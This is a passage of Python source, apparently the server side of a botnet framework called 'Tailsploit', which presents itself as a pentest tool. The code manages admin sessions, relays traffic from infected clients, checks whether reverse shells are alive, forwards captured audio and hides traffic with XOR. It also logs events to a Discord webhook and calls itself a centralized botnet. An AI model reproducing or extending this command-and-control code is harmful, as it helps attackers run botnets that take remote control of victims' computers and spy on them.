                # By the way we are not running this function in a separate thread because if we have 500 clients + few admins, the server will need to handle around 500+ threads so not optimized at all.
                admin_info = {"socket": client_socket, "addr": client_addr, "join_time": time.time(), "token": AUTHENTICATION_KEY, "permission": self.UserPermission}
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Starting Administrator Session... Connection Initiated - {AdminUsername} ({Fore.GREEN}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")

                self.admins[AdminUsername] = admin_info
                if self.TAILSPLOIT_LOG_WEBOOK:
                    TailsploitIncomingConnectionAdminClientAuthorized(client_addr)

                admin_thread = threading.Thread(target=self.handle_admin, args=(client_socket, client_addr, AdminUsername), name=f"Tailsploit Admin Session Handler - @{AdminUsername}")
                admin_thread.start()
            else:
                pass
    
    @StaticMethodCommandHandler("latency", is_available=True, exact_match=True, min_rank=1)
    def TailsploitPingServer(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if len(args) < 0:
            InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'ping'"
            InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(InvalidFormatXOR)
            return
        time.sleep(0.001)
        end_time = time.time() * 1000  # Record end time in milliseconds
        response_time = end_time - self.TIME_MS

        ResponseTailsploitPing = f"[{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server is alive: {Fore.GREEN}{response_time:.2f} ms{Style.RESET_ALL}"
        ResponseTailsploitPingXOR = self.handleXOREncryption(ResponseTailsploitPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        admin_socket.send(ResponseTailsploitPingXOR)

    @StaticMethodCommandHandler("kick", is_available=True, exact_match=False, min_rank=3)
    def TailsploitOnKickAdmin(self, admin_socket, admin_username, handleAdminShellCommands, *args):
            if len(args) < 1:
                InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'kick  <username>.'"
                InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(InvalidFormatXOR)
                return
            if args[0] in self.admins:
                admin_info = self.admins[args[0]]
                KickedFromServer = "--FLAG_KICKED_FROM_SERVER"
                KickedFromServerXOR = self.handleXOREncryption(KickedFromServer.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                TargetSocket = admin_info["socket"]
                TargetSocket.send(KickedFromServerXOR)
                TargetSocket.close()
                SuccessfullyKickedUserFromServer = f"[{Fore.GREEN}*{Style.RESET_ALL}] Administrator '{Fore.GREEN}{args[0]}{Style.RESET_ALL}' has been successfully kicked."
                SuccessfullyKickedUserFromServerXOR = self.handleXOREncryption(SuccessfullyKickedUserFromServer.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(SuccessfullyKickedUserFromServerXOR)
                print(f"[{Fore.RED}-{Style.RESET_ALL}] Administrator '{args[0]}' has been kicked by {admin_username}")

            else:
                AdminNotFound = f"[{Fore.RED}-{Style.RESET_ALL}] Administrator '{Fore.RED}{args[0]}{Style.RESET_ALL}' not found."
                AdminNotFoundXOR = self.handleXOREncryption(AdminNotFound.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(AdminNotFoundXOR)


    def TailsploitTrafficCommunicationData(self):
        while True:
            try:
                if not self.clients:
                    continue  # No clients, continue to the next iteration

                readable, _, _ = select.select(list(self.clients.values()), [], [], 1)
                
                for client_socket in readable:
                    try:
                        data = client_socket.recv(4096)
                        if data:
                            self.IncomingDataSocket(client_socket, data)
                    except UnicodeDecodeError:
                        pass
                    except ConnectionResetError:
                        self.HandleClientDisconnect(client_socket)
                            
            except Exception as e:
                print("ERROR: ", e)


    def IncomingDataSocket(self, client_socket, data):
        if data.startswith(b"AUD:"):
            self.ForwardToAdminSocket(data)
        else:
            decoded_data = data.decode("utf-8")
            self.process_data(client_socket, decoded_data)

    def HandleClientDisconnect(self, client_socket):
        with self.clients_lock:
            for client_addr, socket in self.clients.items():
                if socket == client_socket:
                    del self.clients[client_addr]
                    if client_addr not in self.disconnected_clients:
                        self.disconnected_clients.add(client_addr)
                        print(f"{Fore.RED}[-]{Style.RESET_ALL} Client {Fore.YELLOW}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL} Disconnected from the botnet")

    def ForwardToAdminSocket(self, data):
        if self.admin_socket:
            self.admin_socket.send(data)

    def process_data(self, client_socket, decoded_data):
        if decoded_data == "REVERSE_SHELL_THREAD=ISALIVE?TRUE":
            try:
                isAlive = f"[{Fore.GREEN}*{Style.RESET_ALL}] Reverse Shell target is alive"
                isAliveXOR = self.handleXOREncryption(isAlive.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                self.admin_socket.send(isAliveXOR)
            except Exception as e:
                print(e)
        else:
            SendingDataXOR = self.handleXOREncryption(decoded_data.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            self.admin_socket.send(SendingDataXOR)

    def ConfigurationTailsploitServer(self):
        WebhookPrimaryIndex = None
        WebhookSecondaryIndex = None
        os.system("cls")
        spin = Spinner(Box1)
        for i in range(50):
            print(u"\r{0} Starting Tailsploit Server...".format(spin.next()), end="")
            sys.stdout.flush()
            time.sleep(0.1)
        os.system("cls")
        while True:
            print("")
            TailsploitWebhook = input(f"[{Fore.RED}*{Style.RESET_ALL}] {Fore.RED}Tailsploit{Style.RESET_ALL} - Would you like to enable Discord Webhook ? ({Fore.YELLOW}tailsploit-server-config.json{Style.RESET_ALL}) > ")
            if TailsploitWebhook == "y":
                self.TAILSPLOIT_LOG_WEBOOK = True
                print("")
                print(f"[{Fore.YELLOW}*{Style.RESET_ALL}] Verifying Webhook status...")
                time.sleep(2)
                FirstIndex = TailsploitWebRequestFirstIndex()
                SecondIndex = TailsploitWebRequestSecondIndex()
                print("")
                if FirstIndex == "--FLAG_WEBHOOK_FIRST_SUCESS":
                    print(f"1. [{Fore.GREEN}+{Style.RESET_ALL}] Status: {Fore.GREEN}200{Style.RESET_ALL}")
                    WebhookPrimaryIndex = True
                elif FirstIndex == "--FLAG_WEBHOOK_FIRST_ERROR":
                    print(f"1. [{Fore.RED}-{Style.RESET_ALL}] Status: {Fore.RED}404{Style.RESET_ALL}- Please verify your webhook URL.")
                else:
                    print(f"[{Fore.RED}*{Style.RESET_ALL}] An error occured while checking first webhook.")
                if SecondIndex == "--FLAG_WEBHOOK_SECOND_SUCESS":
                    WebhookSecondaryIndex = True
                    print(f"2. [{Fore.GREEN}+{Style.RESET_ALL}] Status: {Fore.GREEN}200{Style.RESET_ALL}")
                elif SecondIndex == "--FLAG_WEBHOOK_SECOND_ERROR":
                    print(f"2. [{Fore.RED}-{Style.RESET_ALL}] Status: {Fore.RED}404{Style.RESET_ALL} - Please verify your webhook URL.")
                else:
                    print(f"[{Fore.RED}*{Style.RESET_ALL}] An error occured while checking second webhook.")
                
                if WebhookPrimaryIndex and WebhookSecondaryIndex:
                    time.sleep(1)
                    os.system("cls")
                    self.InitializingTailsploitServer()
                    break

            elif TailsploitWebhook == "n":
                self.TAILSPLOIT_LOG_WEBOOK = False
                
                print("")
                print(f"[{Fore.RED}*{Style.RESET_ALL}] Skipping Discord Webhook Setup")
                break
            else:
                continue
        

    def InitializingTailsploitServer(self):
        start_time = time.time()  # Record the start time

        print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Setting up Tailsploit Server...")
        time.sleep(0.5)
        try:
            print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Checking Port Provided Format...")
            time.sleep(0.1)
            print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Checking IPv4 Provided Format...")
            socket.inet_pton(socket.AF_INET, self.SERVER_IP)  # Check if valid IP address
            if 0 < self.PORT_IP < 65536:  # Check if valid port number
                print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Done, Port binded to Tailsploit Server")
                time.sleep(0.1)
            else:
                print("PORT")
        except:
            print("Error Port")
            
        print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Checking Tailsploit Dependencies")
        time.sleep(0.1)
        print(f"[{Fore.GREEN}*{Style.RESET_ALL}] All required dependencies are satisfied.")
        time.sleep(0.1)
        print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Binding the Tailsploit Server socket...")
        time.sleep(0.2)
        print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server socket bound successfully.")
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((self.SERVER_IP, self.PORT_IP))
        server_socket.listen()
        end_time = time.time()  # Record the end time after the delay
        elapsed_time_ms = (end_time - start_time) * 1000
        os.system("cls")
        print("")
        print("")
        print(f"""                        
               .*+      Tailsploit Framework Server (Enjoy Pentest !)
             .+@@@      
           =#@@@@@      ━━━━━━━     
     .=*#%@@@@@@@+      
   +@@@@@@@@@@@@+       [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Status: {Fore.GREEN}Running{Style.RESET_ALL}
 :%@@@@@@@@@@@*.        
.@@@@@@@@@#+-     -=    [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Encryption Type: {Fore.YELLOW}XOR Encryption (Low-Level){Style.RESET_ALL}
%@@@@#=:        -#@@    
@@%-         .=@@@@@    [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Information: {self.SERVER_IP} : {self.PORT_IP}
--      :=+#%@@@@@@*    
     .*@@@@@@@@@@@%     [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Botnet Type: {Fore.YELLOW}Centralized Node (Client-Server){Style.RESET_ALL}
   .*@@@@@@@@@@@@+      
   %@@@@@@@@@%+:        [{Fore.GREEN}*{Style.RESET_ALL}] Server Started In {Fore.GREEN}{elapsed_time_ms:.2f}{Style.RESET_ALL} ms
  =@@@@%*=:.            
  +@@#:                 For more information, read the Tailsploit documentation : \x1B[4mhttps://www.tailsploit.com\x1B[0m
  -=


\x1B[4mTailsploit Server Log\x1B[0m >
""")

        data_thread = threading.Thread(target=self.TailsploitTrafficCommunicationData, name="Traffic Communication Data Handler [Tailsploit Server (XOR)]")
        data_thread.start()

        while True:
            client_socket, client_addr = server_socket.accept()

            #print(f"[+] Accepted connection from: {client_addr}")

            self.handle_client(client_socket, client_addr)

if __name__ == "__main__":
    x = ServerShell()
    x.InitializingTailsploitServer()
